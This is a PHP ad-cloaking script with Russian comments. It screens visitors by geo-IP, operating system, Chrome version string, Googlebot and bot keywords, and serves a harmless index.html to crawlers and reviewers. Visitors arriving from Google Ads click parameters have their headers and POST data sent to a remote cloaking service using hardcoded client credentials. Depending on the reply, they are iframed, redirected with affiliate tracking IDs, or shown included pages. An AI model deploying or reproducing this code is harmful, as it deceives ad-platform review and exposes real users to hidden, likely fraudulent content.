<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? ''; 

$ALLOWED_COUNTRIES = json_decode('{{allowedCountries}}', true);
$allowedOS         = json_decode('{{allowedOS}}', true);

if (preg_match('/Chrome\/(\d+)\.([0-9.]+)/i', $userAgent, $matches)) {
    
    $minorVersion = $matches[2]; // Берем хвост версии
    
    // Если хвост НЕ равен 0.0.0 — рубим запрос
    if ($minorVersion !== '0.0.0') {
        // logFail('FAKE_CHROME_VERSION');
        include 'index.html';
        exit;
    }
}


/* =========================
   3. REAL IP
========================= */

function getUserIp() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '';
}

$ip = getUserIp();
if ($ip === '127.0.0.1' || $ip === '') {
    $ip = '8.8.8.8'; // local test / fallback
}


/* =========================
   4. GEO CHECK (ПОСЛЕ ПАРАМЕТРОВ)
========================= */

function getGeoMulti($ip) {
    // список резервных сервисов
    $services = [
        'ip-api' => [
            'url' => "http://ip-api.com/json/%s?fields=countryCode",
            'key' => 'countryCode'
        ],
        'geojs' => [
            'url' => "https://get.geojs.io/v1/ip/country/%s.json",
            'key' => 'country'
        ],
        'ipwhois' => [
            'url' => "http://ipwhois.app/json/%s",
            'key' => 'country_code'
        ]
    ];

    foreach ($services as $service) {
        $url = sprintf($service['url'], $ip);

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 2,   // не ждём вечно
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($response && $httpCode === 200) {
            $data        = json_decode($response, true);
            $countryCode = $data[$service['key']] ?? null;

            if ($countryCode && strlen($countryCode) === 2) {
                return strtoupper($countryCode);
            }
        }
    }

    return null; // никто не ответил
}

// 1) пробуем взять страну из Cloudflare
$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? null;

// 2) если CF нет — идём по списку API
if ($country === null) {
    $country = getGeoMulti($ip);
}

// 3) если так и не смогли определить — логируем, НО НЕ РЕЖЕМ
if ($country === null) {
    //logFail('GEO_UNKNOWN', ['ip' => $ip]);
} else {
    // 4) если страна определена и не входит в список — блочим
    if (!in_array($country, $ALLOWED_COUNTRIES, true)) {
        //logFail('GEO_BLOCK', ['country' => $country]);
        include 'index.html';
        exit;
    }
}

// Функция определения текущей ОС
function getDeviceOS($ua) {
    if (empty($ua)) return 'other';
    
    // Сначала ищем яблочные мобилки
    if (preg_match('/(iPhone|iPad|iPod)/i', $ua)) return 'iphone';
    // Ищем Android
    if (stripos($ua, 'Android') !== false) return 'android';
    // Ищем десктопный Windows
    if (stripos($ua, 'Windows NT') !== false) return 'windows';
    // Ищем десктопный Mac
    if (preg_match('/(Macintosh|Mac OS X)/i', $ua)) return 'macos';
    
    // Если ничего не подошло
    return 'other';
}

$currentOS = getDeviceOS($userAgent);

// Проверяем, разрешена ли эта ОС
if (isset($allowedOS[$currentOS]) && $allowedOS[$currentOS] === false) {
    // logFail('OS_BLOCK');
    include 'index.html';
    exit;
}


 
// --- Googlebot: всегда уводим на index.html (после чистки tracking-параметров) --- 
if (stripos($userAgent, 'Googlebot') !== false) { 
 
    $paramsToRemove = ['gclid', 'wbraid', 'gbraid']; 
 
    // Если есть tracking-параметры — чистим URL и редиректим 
    foreach ($paramsToRemove as $param) { 
        if (isset($_GET[$param])) { 
 
            $url = $_SERVER['REQUEST_URI']; 
 
            // Удаляем конкретный параметр из query string 
            $url = preg_replace('/([?&])' . preg_quote($param, '/') . '=[^&]*(&|$)/', '$1', $url); 
 
            // Убираем хвостовые & и ? 
            if (strpos($url, '?') !== false && substr($url, -1) === '&') { 
                $url = rtrim($url, '&'); 
            } 
            if (strpos($url, '?') !== false && substr($url, -1) === '?') { 
                $url = rtrim($url, '?'); 
            } 
 
            header('Location: ' . $url, true, 302); 
            exit; 
        } 
    } 
 
    // Если tracking-параметров нет (или уже чисто) — всегда показываем index.html 
    include 'index.html'; 
    exit; 
} 
 
// --- Все остальные: ваша исходная логика параметров --- 
$hasTrackingParam = isset($_GET['gclid']) || isset($_GET['wbraid']) || isset($_GET['gbraid']);
$hasTmParam       = isset($_GET['tm']); 
 
if ($hasTrackingParam && $hasTmParam) { 
    // Пропускаем дальше (как у вас было пусто) — код продолжит выполняться ниже 
} else { 
    include 'index.html'; 
    exit; 
}

$devAndBotKeywords = [
    // Боты и мессенджеры
    'bot', 'crawl', 'spider', 'slurp', 'google', 'bing', 'yandex', 'duckduck', 'baidu', 'facebook', 'telegram', 'whatsapp',
    // Дев-браузеры
    'Chrome Dev', 'Chrome Canary', 'Firefox Nightly', 'Edge Dev', 'Edg Dev', 'Opera Developer', 'MIUI Browser Dev'
];

$pattern = '/' . implode('|', $devAndBotKeywords) . '/i';

if (
    $userAgent === '' ||
    preg_match($pattern, $userAgent)
) {
    // logFail('BOT_BLOCK');
    include 'index.html';
    exit;
}

$isTarget = (new RequestHandlerClient())->run();



class RequestHandlerClient
{
    const SERVER_URL = 'https://rbl.palladium.expert';

    /**
     * @param int    $clientId
     * @param string $company
     * @param string $secret
     *
     * @return void
     * @throws \Exception
     */
    public function run()
    {
        $headers = [];
        $headers['request'] = $this->collectRequestData();
        $headers['jsrequest'] = $this->collectJsRequestData();
        $headers['server'] = $this->collectHeaders();
        $headers['auth']['clientId'] = 3838;
        $headers['auth']['clientCompany'] = "mKAHhg1rsrrHUtV3LOAA";
        $headers['auth']['clientSecret'] = "MzgzOG1LQUhoZzFyc3JySFV0VjNMT0FBY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==";
        $headers['server']['bannerSource'] = 'adwords';

        return $this->curlSend($headers);
    }

    /**
     * @param array<string, mixed> $params
     *
     * @return bool
     * @throws \Exception
     */
    public function curlSend(array $params)
    {
        $answer = false;
        $curl = curl_init(self::SERVER_URL);
        if ($curl) {
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($params));

            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3);
            curl_setopt($curl, CURLOPT_TIMEOUT, 4);
            curl_setopt($curl, CURLOPT_TIMEOUT_MS, 4000);
            curl_setopt($curl, CURLOPT_FORBID_REUSE, true);

            $result = curl_exec($curl);
            if ($result) {
				$serverOut = json_decode(
					$result,
					true
				);
				$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);

				if ($status == 200 && is_array($serverOut)) {
					$answer = $this->handleServerReply($serverOut);
					return $answer;
				}
			}
        }

		$this->getDefaultAnswer();
        return $answer;
    }

    protected function handleServerReply($reply)
    {
        $result = (bool) ($reply['result'] ? $reply['result'] : 0);

        if (
			isset($reply['mode']) &&
			(
				(isset($reply['target'])) ||
				(isset($reply['content']) && !empty($reply['content']))
			)
		) {
            $target = $reply['target'];
            $mode = $reply['mode'];
            $content = $reply['content'];

            if (preg_match('/^https?:/i', $target) && $mode == 3) {
                // do fallback to mode2
                $mode = 2;
            }

            if ($result && $mode == 1) {
				$this->displayIFrame($target);
				exit;
			} elseif ($result && $mode == 2) {
				$domain = $_SERVER['SERVER_NAME'];
				$target = $target . "&{{alias}}&sub_id_1={{user}}&sub_id_2={{campaign}}&sub_id_3=" . urlencode($domain);
				header("Location: {$target}");
				exit;
			} elseif ($result && $mode == 3) {
				$target = parse_url($target);
				if (isset($target['query'])) {
					parse_str($target['query'], $_GET);
				}
				$this->hideFormNotification();
				require_once $this->sanitizePath($target['path']);
				exit;
			} elseif ($result && $mode == 4) {
				echo $content;
				exit;
			} else if (!$result && $mode == 5) {
				//
			} elseif ($mode == 6) {
				//
			} else {
				$path = $this->sanitizePath($target);
				if (!$this->isLocal($path)) {
					header("404 Not Found", true, 404);
				} else {
					$this->hideFormNotification();
					require_once $path;
				}
				exit;
			}
        }

        return $result;
    }

	private function hideFormNotification()
	{
		echo "";
		//echo "<script>if ( window.history.replaceState ) {window.history.replaceState( null, null, window.location.href );}</script>";
	}

	private function displayIFrame($target) {
		$target = htmlspecialchars($target);
		echo "<html>
                  <head>
                  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
                  </head>
                  <body>" .
                  $this->hideFormNotification() .
                  "<iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>
                  </body>
              </html>";
	}

    private function sanitizePath($path)
    {
        if ($path[0] !== '/') {
            $path = __DIR__ . '/' . $path;
        } else {
            $path = __DIR__ . $path;
        }
        return $path;
    }

    private function isLocal($path)
    {
        // do not validate url via filter_var
        $url = parse_url($path);

        if (!isset($url['scheme']) || !isset($url['host'])) {
            return true;
        } else {
            return false;
        }
    }


    /**
     * Get all HTTP server headers and few additional ones
     *
     * @return mixed
     */
    protected function collectHeaders()
    {
        $userParams = [
            'REMOTE_ADDR',
            'SERVER_PROTOCOL',
            'SERVER_PORT',
            'REMOTE_PORT',
            'QUERY_STRING',
            'REQUEST_SCHEME',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'X_FB_HTTP_ENGINE',
            'X_PURPOSE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'X-Forwarded-Host',
            'X-Forwarded-For',
            'X-Frame-Options',
        ];

        $headers = [];
        foreach ($_SERVER as $key => $value) {
            if (in_array($key, $userParams) || substr_compare('HTTP', $key, 0, 4) == 0) {
                $headers[$key] = $value;
            }
        }

        return $headers;
    }

    private function collectRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['data'])) {
            	$data = json_decode($_POST['data'], true);
            	if (JSON_ERROR_NONE !== json_last_error()) {
            		$data = json_decode(
						stripslashes($_POST['data']),
						true
					);
            	}
                unset($_REQUEST['data']);
            }

            if (!empty($_POST['crossref_sessionid'])) {
                $data['cr-session-id'] = $_POST['crossref_sessionid'];
                unset($_POST['crossref_sessionid']);
            }
        }

        return $data;
    }

    public function collectJsRequestData(): array
    {
        $data = [];
        if (!empty($_POST)) {
            if (!empty($_POST['jsdata'])) {
                $data = json_decode($_POST['jsdata'], true);
                if (JSON_ERROR_NONE !== json_last_error()) {
                    $data = json_decode(
                        stripslashes($_POST['jsdata']),
                        true
                    );
                }
                unset($_REQUEST['jsdata']);
            }
        }
        return $data;
    }

    /**
     * Default answer for the curl request in case of fault
     *
     * @return bool
     */
    private function getDefaultAnswer()
    {
		header($_SERVER["SERVER_PROTOCOL"] . ' 500 Internal Server Error', true, 500);
		echo "<h1>500 Internal Server Error</h1>
		<p>The request was unsuccessful due to an unexpected condition encountered by the server.</p>";
		exit;
    }
}
